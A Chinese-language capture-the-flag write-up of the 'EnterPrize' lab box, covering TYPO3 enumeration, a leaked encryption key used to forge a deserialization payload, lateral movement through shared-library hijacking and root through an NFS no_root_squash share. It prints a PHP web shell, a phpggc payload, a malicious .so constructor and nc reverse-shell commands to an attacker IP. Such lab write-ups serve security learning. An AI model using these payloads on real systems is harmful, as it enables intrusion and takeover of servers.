# EnterPrize

---

## 端口扫描

循例nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/01684e3d6df54de7b018f53a3e5e6f15.png)

## Web枚举

进到enterprize.thm

![在这里插入图片描述](https://img-blog.csdnimg.cn/9679224caf9e46de8979ff0f50ba9afb.png)

gobuster扫

![在这里插入图片描述](https://img-blog.csdnimg.cn/ee0c83875f054bfa8cb511ab0080ce00.png)

到处扫了一段时间，ffuf扫vhost扫到个maintest

![在这里插入图片描述](https://img-blog.csdnimg.cn/778b3a724bbe4359b3259d83a264919a.png)

进到maintest，是typo3

![在这里插入图片描述](https://img-blog.csdnimg.cn/1a216f90536d476381da33529bfaef74.png)

/typo3conf下有些文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/0d75c9e829a4440190a306188769b912.png)

在LocalConfiguration.old有一个key，它应该就是提示当中所说的

![在这里插入图片描述](https://img-blog.csdnimg.cn/a696e245437945f295bcc3a69db99a3f.png)

在谷歌找到一篇有关typo3 encryptionkey到RCE的[文章](https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html#:~:text=This%20encryptionKey%20can%20be%20found%20in%20the%20typo3conf%2FLocalConfiguration.php,%24localConfigurationArray%20%5B%20%27SYS%27%20%5D%20%5B%20%27encryptionKey%27%5D%20%3D%20%24randomKey%3B)

值得关注的是这段代码

```php
    /**
     * Initializes the current state of the form, based on the request
     * @throws BadRequestException
     */
    protected function initializeFormStateFromRequest()
    {
        $serializedFormStateWithHmac = $this->request->getInternalArgument('__state');
        if ($serializedFormStateWithHmac === null) {
            $this->formState = GeneralUtility::makeInstance(FormState::class);
        } else {
            try {
                $serializedFormState = $this->hashService->validateAndStripHmac($serializedFormStateWithHmac);
            } catch (InvalidHashException | InvalidArgumentForHashGenerationException $e) {
                throw new BadRequestException('The HMAC of the form could not be validated.', 1581862823);
            }
            $this->formState = unserialize(base64_decode($serializedFormState));
        }
    }
```

encryptionkey用于计算HMAC，而一旦我们利用有效的HMAC将能构造反序列进行RCE

```bash
echo '<?php system($_GET[1]);?>' > ./exp.php
```

这里不能有双引号，否则可能会破坏后面序列化的payload

使用phpggc生成序列化payload

**注意路径，typo3在public下**

![在这里插入图片描述](https://img-blog.csdnimg.cn/82db7e315d3e4c668535935fef0308f8.png)

```json
a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"GuzzleHttp\Cookie\CookieJarcookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"GuzzleHttp\Cookie\SetCookiedata";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>
";}}}s:39:"GuzzleHttp\Cookie\CookieJarstrictMode";N;s:41:"GuzzleHttp\Cookie\FileCookieJarfilename";s:50:"/var/www/html/public/fileadmin/_temp_/backdoor.php";s:52:"GuzzleHttp\Cookie\FileCookieJarstoreSessionCookies";b:1;}i:7;i:7;}
```

使用php进行hmac加密

```php
<?php
$secrt = hash_hmac('sha1', '<payload>', "<encryptkey>");
print($secrt);
?>
```

我们利用contact form表单交付payload

![在这里插入图片描述](https://img-blog.csdnimg.cn/b900eee9a2e4436f81c8d398898813ce.png)

burp修改__state

![在这里插入图片描述](https://img-blog.csdnimg.cn/1b55323b3acd40e9ad361106a6112208.png)

访问文件，成功RCE

![在这里插入图片描述](https://img-blog.csdnimg.cn/d06f33ba5c7d4d73bcd42207144e21f6.png)

### Reverse Shell

用curl把nc传过去

![在这里插入图片描述](https://img-blog.csdnimg.cn/fc377d4613324c809859a0f812721561.png)

reverse shell payload

```bash
mkfifo /tmp/f1;/tmp/nc 10.14.39.48 8888 < /tmp/f1 | /bin/bash > /tmp/f1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/dbfeaee894174a93ad7476505cf01549.png)

getshell

## 横向移动

在john家目录下发现develop

![在这里插入图片描述](https://img-blog.csdnimg.cn/961905590db5463aa4036adb1274cf96.png)

传个pspy64过去看一眼, 在定时执行myapp

![在这里插入图片描述](https://img-blog.csdnimg.cn/2797c97d68574d878fb3711a1fa8a376.png)

通过ldd查看，发现了一个john自定义的so文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/7fbf769956634244b549100f49cae382.png)

查看/etc/ld.so.conf，这里记录了动态链接库的路径，这里又指向了/etc/ld.so.conf.d下的所有conf文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/0179b32f7395497c8f0f34c0bbc08220.png)

有趣的是其中一个文件连接到/home/john/develop的test.conf，而我们有权写入develop文件夹

现在的思路就是通过创建test.conf指向我们自己创建的恶意so文件，让myapp加载从而移动到john

创建test.conf

![在这里插入图片描述](https://img-blog.csdnimg.cn/ec3983106de54d0abeeb37f8b3dd6799.png)

创建c文件

```c
#include <stdio.h>
#include <unistd.h>

__attribute__ ((__constructor__)) void hack (void){
    system("mkfifo /tmp/f3;/tmp/nc 10.14.39.48 9999 < /tmp/f3 | /bin/bash > /tmp/f3");
}
```

编译，通过wget传过去

![在这里插入图片描述](https://img-blog.csdnimg.cn/9156fcdcb6b44b0f8e8482c007204ef3.png)

此时再看ldd，libcustom.so已被劫持，libcustom.so已经指向我们创建的so文件了

![在这里插入图片描述](https://img-blog.csdnimg.cn/24e3e6d8ae424436abc46a42500601a2.png)

我折腾了几个小时，我发现cronjob执行了代码，但似乎执行失败了，我找不到原因，我也尝试了更换payload，但依旧是失败，即使pspy捕获到了它执行了命令，但并不成功

但我手动执行myapp是能够正常执行的，这也意味着我的payload没有任何问题，是房间可能存在问题导致的

**这里我直接打了个pwnkit过去直接到了root**

但为了体验房间内容，在john下创建ssh key，直接进到john

user flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/7f100761f8314b30b526b35120c19ff5.png)


## 权限提升


ss -tlnp发现开了应该是nfs

![在这里插入图片描述](https://img-blog.csdnimg.cn/c7574efc7cfa4333bf82918faa0e7639.png)

/var/nfs的共享被设置了no_root_squash

![在这里插入图片描述](https://img-blog.csdnimg.cn/2cce0335a9b646638b883e3e9d1df06d.png)

由于防火墙的存在，我们通过ssh进行端口转发

![在这里插入图片描述](https://img-blog.csdnimg.cn/d73ea4a41b244454bffd13fc007a12d0.png)

挂载

![在这里插入图片描述](https://img-blog.csdnimg.cn/56f291312ded494f9f1080e51fce5676.png)

从靶机中复制其bash过来

![在这里插入图片描述](https://img-blog.csdnimg.cn/82a02cfe47e1409c958dd409f3db37ef.png)

在攻击机中重新复制靶机的bash，并为其赋suid

这里重新复制一遍是为了改变文件的所有者为root，否则suid不是root那就没用了

![在这里插入图片描述](https://img-blog.csdnimg.cn/767a30f7c4e147dc952bed8f5a1c18de.png)

直接利用suid bash到root，拿到root flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/7f99e608661645848f95da90a05e0485.png)
